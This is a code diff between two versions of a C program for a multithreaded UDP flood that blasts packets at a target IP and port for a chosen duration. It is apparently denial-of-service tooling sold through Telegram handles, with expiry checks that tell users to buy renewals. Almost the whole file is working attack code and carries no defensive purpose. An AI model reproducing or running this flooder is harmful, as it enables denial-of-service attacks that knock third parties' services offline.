@@ -1,144 +1,124 @@
+#define _XOPEN_SOURCE 700
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
 #include <pthread.h>
 #include <unistd.h>
-#include <signal.h>
-#include <libgen.h>
+#include <arpa/inet.h>
 #include <time.h>
 
-#define EXPIRY_YEAR 2026
-#define EXPIRY_MONTH 12
-#define EXPIRY_DAY 30
+#define MAX_THREADS 50
+#define PAYLOAD_SIZE 1024  // Optimal payload size for most networks
 
-// Default Values (Auto-set)
-#define DEFAULT_BYTE_SIZE 0
-#define DEFAULT_THREADS 0
+// Expiry date (Format: YYYY-MM-DD)
+#define EXPIRY_DATE "2025-08-9"
 
+// Define the AttackParams structure
 typedef struct {
-    char *target_ip;
-    int target_port;
+    char ip[16];
+    int port;
     int duration;
-    int byte_size;
-    int thread_id;
-} program_params;
+} AttackParams;
 
-volatile int keep_running = 1;
+// Function to check if the current date is past the expiry date
+int is_expired() {
+    struct tm expiry_tm = {0};
+    struct tm current_tm = {0};
 
-// Expiry Check
-int check_expiry() {
-    time_t t = time(NULL);
-    struct tm *current = localtime(&t);
-    
-    int current_date = (current->tm_year + 1900) * 10000 + (current->tm_mon + 1) * 100 + current->tm_mday;
-    int expiry_date = EXPIRY_YEAR * 10000 + EXPIRY_MONTH * 100 + EXPIRY_DAY;
+    // Set the expiry date (hardcoded)
+    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_tm);
+    // Get the current date
+    time_t now = time(NULL);
+    localtime_r(&now, &current_tm);
 
-    if (current_date > expiry_date) {
-        printf("\n[BINARY EXPIRED] Contact Telegram: @LEGENDXOPL\n");
-        return 0;
+    // Compare current date with expiry date
+    if (difftime(mktime(&current_tm), mktime(&expiry_tm)) > 0) {
+        return 1;  // Expired
     }
-    return 1;
+    return 0;  // Not expired
 }
 
-// Signal Handler
-void handle_signal(int signal) {
-    keep_running = 0;
+// Function to generate a powerful, randomized payload
+void generate_payload(char* payload, int size) {
+    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.";
+    for (int i = 0; i < size - 1; i++) {
+        payload[i] = charset[rand() % (sizeof(charset) - 1)];
+    }
+    payload[size - 1] = '\0'; // Null-terminate the payload string
 }
 
-// UDP Attack Function
-void *process_network(void *arg) {
-    program_params *params = (program_params *)arg;
+// Callback function for libcurl to discard the response body
+size_t discard_response(void* ptr, size_t size, size_t nmemb, void* userdata) {
+    return size * nmemb;
+}
+
+// Thread function to send payload
+void* send_payload(void* arg) {
+    AttackParams* params = (AttackParams*)arg;
     int sock;
     struct sockaddr_in server_addr;
-    char *message;
-    
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) return NULL;
+    char payload[PAYLOAD_SIZE];
 
-    memset(&server_addr, 0, sizeof(server_addr));
+    // Generate a powerful randomized payload
+    generate_payload(payload, PAYLOAD_SIZE);
+
+    sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
+    if (sock < 0) {
+        perror("Socket creation failed");
+        pthread_exit(NULL);
+    }
+
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(params->target_port);
-    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);
+    server_addr.sin_port = htons(params->port);
+    server_addr.sin_addr.s_addr = inet_addr(params->ip);
 
-    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
-        fprintf(stderr, "Invalid IP address: %s\n", params->target_ip);
-        close(sock);
-        return NULL;
-    }
-
-    message = (char *)malloc(params->byte_size);
-    if (message == NULL) {
-        close(sock);
-        return NULL;
-    }
-    memset(message, 'A', params->byte_size);
-
-    time_t end_time = time(NULL) + params->duration;
-    while (time(NULL) < end_time && keep_running) {
-        sendto(sock, message, params->byte_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-    }
-
-    free(message);
-    close(sock);
-    return NULL;
-}
-
-// Print Banner
-void print_banner() {
-    printf("\n[ LEGEND ATTACK TOOL ]\n");
-}
-
-// Main Function
-int main(int argc, char *argv[]) {
-    print_banner();
-    if (!check_expiry()) return 1;
-
-    // Input Parsing
-    if (argc < 4) {
-        printf("Usage: %s <IP> <PORT> <DURATION> [BYTE_SIZE] [THREADS]\n", argv[0]);
-        return 1;
-    }
-
-    char *target_ip = argv[1];
-    int target_port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
-    int byte_size = (argc >= 5) ? atoi(argv[4]) : DEFAULT_BYTE_SIZE;
-    int thread_count = (argc >= 6) ? atoi(argv[5]) : DEFAULT_THREADS;
-
-    // Validate input
-    if (target_port <= 0 || target_port > 65535 || duration <= 0 || byte_size <= 0 || thread_count <= 0) {
-        printf("Invalid input values!\n");
-        return 1;
-    }
-
-    // Setup signal handler
-    signal(SIGINT, handle_signal);
-
-    // Allocate threads
-    pthread_t threads[thread_count];
-    program_params params[thread_count];
-
-    printf("Starting attack on %s:%d | Duration: %d sec | Bytes: %d | Threads: %d\n", target_ip, target_port, duration, byte_size, thread_count);
-
-    for (int i = 0; i < thread_count; i++) {
-        params[i].target_ip = target_ip;
-        params[i].target_port = target_port;
-        params[i].duration = duration;
-        params[i].byte_size = byte_size;
-        params[i].thread_id = i;
-
-        if (pthread_create(&threads[i], NULL, process_network, &params[i]) != 0) {
-            printf("Thread creation failed\n");
-            return 1;
+    time_t start_time = time(NULL);
+    while (time(NULL) - start_time < params->duration) {
+        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+            perror("Send failed");
+            continue; // Retry instead of breaking
         }
     }
 
-    for (int i = 0; i < thread_count; i++) {
+    close(sock);
+    pthread_exit(NULL);
+}
+
+// Main function
+int main(int argc, char* argv[]) {
+    if (argc != 4) {
+        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
+        return 1;
+    }
+
+    // Check if the program is expired
+    if (is_expired()) {
+        printf("BUY NEW FROM @IPxKINGYT\n");
+        return 1;
+    }
+
+    AttackParams params;
+    strcpy(params.ip, argv[1]);
+    params.port = atoi(argv[2]);
+    params.duration = atoi(argv[3]);
+
+    pthread_t threads[MAX_THREADS];
+
+    printf("Launching attack on %s:%d for %d seconds with %d threads and payload size %d bytes...\n",
+           params.ip, params.port, params.duration, MAX_THREADS, PAYLOAD_SIZE);
+
+    for (int i = 0; i < MAX_THREADS; i++) {
+        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
+            perror("Thread creation failed");
+        }
+    }
+
+    for (int i = 0; i < MAX_THREADS; i++) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("\n[ Attack Complete ]\n");
+    printf("Attack completed on %s:%d for %d seconds.\n",
+           params.ip, params.port, params.duration);
+
     return 0;
 }
